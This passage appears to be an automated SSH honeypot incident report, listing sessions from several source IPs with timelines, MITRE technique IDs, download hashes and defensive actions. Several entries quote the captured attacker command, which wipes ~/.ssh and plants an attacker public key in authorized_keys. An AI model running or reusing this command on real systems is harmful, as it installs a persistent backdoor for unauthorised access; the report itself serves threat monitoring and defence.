| `2026-06-04 17:07:57` | `cowrie.command.failed` |
| `2026-06-04 17:07:57` | `cowrie.log.closed` |
| `2026-06-04 17:07:57` | `cowrie.session.params` |
| `2026-06-04 17:07:57` | `cowrie.command.input` |
| `2026-06-04 17:07:57` | `cowrie.session.file_download` |
| `2026-06-04 17:07:57` | `cowrie.log.closed` |
| `2026-06-04 17:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1cf5a923a1d

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 17:08 |
| **Last Seen** | 2026-06-04 17:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:08:00` | `cowrie.session.connect` |
| `2026-06-04 17:08:00` | `cowrie.client.version` |
| `2026-06-04 17:08:00` | `cowrie.client.kex` |
| `2026-06-04 17:08:00` | `cowrie.login.success` |
| `2026-06-04 17:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a8df8726c02

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 17:20 |
| **Last Seen** | 2026-06-04 17:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:20:22` | `cowrie.session.connect` |
| `2026-06-04 17:20:22` | `cowrie.client.version` |
| `2026-06-04 17:20:22` | `cowrie.client.kex` |
| `2026-06-04 17:20:22` | `cowrie.login.success` |
| `2026-06-04 17:20:23` | `cowrie.session.params` |
| `2026-06-04 17:20:23` | `cowrie.command.input` |
| `2026-06-04 17:20:23` | `cowrie.command.failed` |
| `2026-06-04 17:20:23` | `cowrie.log.closed` |
| `2026-06-04 17:20:23` | `cowrie.session.params` |
| `2026-06-04 17:20:23` | `cowrie.command.input` |
| `2026-06-04 17:20:23` | `cowrie.session.file_download` |
| `2026-06-04 17:20:23` | `cowrie.log.closed` |
| `2026-06-04 17:20:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f3a8b2541c9

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 17:20 |
| **Last Seen** | 2026-06-04 17:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:20:26` | `cowrie.session.connect` |
| `2026-06-04 17:20:26` | `cowrie.client.version` |
| `2026-06-04 17:20:26` | `cowrie.client.kex` |
| `2026-06-04 17:20:26` | `cowrie.login.success` |
| `2026-06-04 17:20:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cbc010af067

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 17:22 |
| **Last Seen** | 2026-06-04 17:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:22:23` | `cowrie.session.connect` |
| `2026-06-04 17:22:23` | `cowrie.client.version` |
| `2026-06-04 17:22:23` | `cowrie.client.kex` |
| `2026-06-04 17:22:23` | `cowrie.login.success` |
| `2026-06-04 17:22:24` | `cowrie.session.params` |
| `2026-06-04 17:22:24` | `cowrie.command.input` |
| `2026-06-04 17:22:24` | `cowrie.command.failed` |
| `2026-06-04 17:22:24` | `cowrie.log.closed` |
| `2026-06-04 17:22:24` | `cowrie.session.params` |
| `2026-06-04 17:22:24` | `cowrie.command.input` |
| `2026-06-04 17:22:24` | `cowrie.session.file_download` |
| `2026-06-04 17:22:24` | `cowrie.log.closed` |
| `2026-06-04 17:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb789760ff8c

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 17:22 |
| **Last Seen** | 2026-06-04 17:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:22:26` | `cowrie.session.connect` |
| `2026-06-04 17:22:26` | `cowrie.client.version` |
| `2026-06-04 17:22:27` | `cowrie.client.kex` |
| `2026-06-04 17:22:27` | `cowrie.login.success` |
| `2026-06-04 17:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9dd34c6d16f

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 17:22 |
| **Last Seen** | 2026-06-04 17:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:22:36` | `cowrie.session.connect` |
| `2026-06-04 17:22:36` | `cowrie.client.version` |
| `2026-06-04 17:22:36` | `cowrie.client.kex` |
| `2026-06-04 17:22:36` | `cowrie.login.success` |
| `2026-06-04 17:22:36` | `cowrie.session.params` |
| `2026-06-04 17:22:36` | `cowrie.command.input` |
| `2026-06-04 17:22:36` | `cowrie.command.failed` |
| `2026-06-04 17:22:37` | `cowrie.log.closed` |
| `2026-06-04 17:22:37` | `cowrie.session.params` |
| `2026-06-04 17:22:37` | `cowrie.command.input` |
| `2026-06-04 17:22:37` | `cowrie.session.file_download` |
| `2026-06-04 17:22:37` | `cowrie.log.closed` |
| `2026-06-04 17:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7498ece6e0a2

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 17:22 |
| **Last Seen** | 2026-06-04 17:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:22:38` | `cowrie.session.connect` |
| `2026-06-04 17:22:38` | `cowrie.client.version` |
| `2026-06-04 17:22:38` | `cowrie.client.kex` |
| `2026-06-04 17:22:39` | `cowrie.login.success` |
| `2026-06-04 17:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd13a60ad1d1

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 17:26 |
| **Last Seen** | 2026-06-04 17:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:26:47` | `cowrie.session.connect` |
| `2026-06-04 17:26:47` | `cowrie.client.version` |
| `2026-06-04 17:26:47` | `cowrie.client.kex` |
| `2026-06-04 17:26:48` | `cowrie.login.success` |
| `2026-06-04 17:26:48` | `cowrie.session.params` |
| `2026-06-04 17:26:48` | `cowrie.command.input` |
| `2026-06-04 17:26:48` | `cowrie.command.failed` |
| `2026-06-04 17:26:48` | `cowrie.log.closed` |
| `2026-06-04 17:26:48` | `cowrie.session.params` |
| `2026-06-04 17:26:48` | `cowrie.command.input` |
| `2026-06-04 17:26:48` | `cowrie.session.file_download` |
| `2026-06-04 17:26:48` | `cowrie.log.closed` |
| `2026-06-04 17:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29cdc283f175

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 17:26 |
| **Last Seen** | 2026-06-04 17:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:26:50` | `cowrie.session.connect` |
| `2026-06-04 17:26:50` | `cowrie.client.version` |
| `2026-06-04 17:26:50` | `cowrie.client.kex` |
| `2026-06-04 17:26:50` | `cowrie.login.success` |
| `2026-06-04 17:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56c87d6a2890

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-04 17:33 |
| **Last Seen** | 2026-06-04 17:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:33:45` | `cowrie.session.connect` |
| `2026-06-04 17:33:45` | `cowrie.client.version` |
| `2026-06-04 17:33:45` | `cowrie.client.kex` |
| `2026-06-04 17:33:46` | `cowrie.login.success` |
| `2026-06-04 17:33:47` | `cowrie.session.params` |
| `2026-06-04 17:33:47` | `cowrie.command.input` |
| `2026-06-04 17:33:47` | `cowrie.command.failed` |
| `2026-06-04 17:33:47` | `cowrie.log.closed` |
| `2026-06-04 17:33:47` | `cowrie.session.params` |
| `2026-06-04 17:33:47` | `cowrie.command.input` |
| `2026-06-04 17:33:47` | `cowrie.session.file_download` |
| `2026-06-04 17:33:47` | `cowrie.log.closed` |
| `2026-06-04 17:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dfc9bc2883b

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-04 17:33 |
| **Last Seen** | 2026-06-04 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:33:49` | `cowrie.session.connect` |
| `2026-06-04 17:33:49` | `cowrie.client.version` |
| `2026-06-04 17:33:49` | `cowrie.client.kex` |
| `2026-06-04 17:33:49` | `cowrie.login.success` |
| `2026-06-04 17:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdebc7d46d74

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-04 17:44 |
| **Last Seen** | 2026-06-04 17:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:44:00` | `cowrie.session.connect` |
| `2026-06-04 17:44:00` | `cowrie.client.version` |
| `2026-06-04 17:44:00` | `cowrie.client.kex` |
| `2026-06-04 17:44:01` | `cowrie.login.success` |
| `2026-06-04 17:44:01` | `cowrie.session.params` |
| `2026-06-04 17:44:01` | `cowrie.command.input` |
| `2026-06-04 17:44:01` | `cowrie.command.failed` |
| `2026-06-04 17:44:01` | `cowrie.log.closed` |
| `2026-06-04 17:44:01` | `cowrie.session.params` |
| `2026-06-04 17:44:01` | `cowrie.command.input` |
| `2026-06-04 17:44:01` | `cowrie.session.file_download` |
| `2026-06-04 17:44:01` | `cowrie.log.closed` |
| `2026-06-04 17:44:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66abfad07dc6

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-04 17:44 |
| **Last Seen** | 2026-06-04 17:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:44:03` | `cowrie.session.connect` |
| `2026-06-04 17:44:03` | `cowrie.client.version` |
| `2026-06-04 17:44:03` | `cowrie.client.kex` |
| `2026-06-04 17:44:04` | `cowrie.login.success` |
| `2026-06-04 17:44:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce64767c6ae1

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-04 17:46 |
| **Last Seen** | 2026-06-04 17:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:46:06` | `cowrie.session.connect` |
| `2026-06-04 17:46:06` | `cowrie.client.version` |
| `2026-06-04 17:46:06` | `cowrie.client.kex` |
| `2026-06-04 17:46:06` | `cowrie.login.success` |
| `2026-06-04 17:46:07` | `cowrie.session.params` |
| `2026-06-04 17:46:07` | `cowrie.command.input` |
| `2026-06-04 17:46:07` | `cowrie.command.failed` |
| `2026-06-04 17:46:07` | `cowrie.log.closed` |
| `2026-06-04 17:46:07` | `cowrie.session.params` |
| `2026-06-04 17:46:07` | `cowrie.command.input` |
| `2026-06-04 17:46:07` | `cowrie.session.file_download` |
| `2026-06-04 17:46:07` | `cowrie.log.closed` |
| `2026-06-04 17:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fc41f9ca7ec

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-04 17:46 |
| **Last Seen** | 2026-06-04 17:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:46:09` | `cowrie.session.connect` |
| `2026-06-04 17:46:09` | `cowrie.client.version` |
| `2026-06-04 17:46:09` | `cowrie.client.kex` |
| `2026-06-04 17:46:10` | `cowrie.login.success` |
| `2026-06-04 17:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f17c36919554

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-04 17:50 |
| **Last Seen** | 2026-06-04 17:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:50:19` | `cowrie.session.connect` |
| `2026-06-04 17:50:19` | `cowrie.client.version` |
| `2026-06-04 17:50:19` | `cowrie.client.kex` |
| `2026-06-04 17:50:20` | `cowrie.login.success` |
| `2026-06-04 17:50:20` | `cowrie.session.params` |
| `2026-06-04 17:50:20` | `cowrie.command.input` |
| `2026-06-04 17:50:20` | `cowrie.command.failed` |
| `2026-06-04 17:50:20` | `cowrie.log.closed` |
| `2026-06-04 17:50:20` | `cowrie.session.params` |
| `2026-06-04 17:50:20` | `cowrie.command.input` |
| `2026-06-04 17:50:21` | `cowrie.session.file_download` |
| `2026-06-04 17:50:21` | `cowrie.log.closed` |
| `2026-06-04 17:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e122b10912b

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-04 17:50 |
| **Last Seen** | 2026-06-04 17:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:50:23` | `cowrie.session.connect` |
| `2026-06-04 17:50:23` | `cowrie.client.version` |
| `2026-06-04 17:50:23` | `cowrie.client.kex` |
| `2026-06-04 17:50:23` | `cowrie.login.success` |
| `2026-06-04 17:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

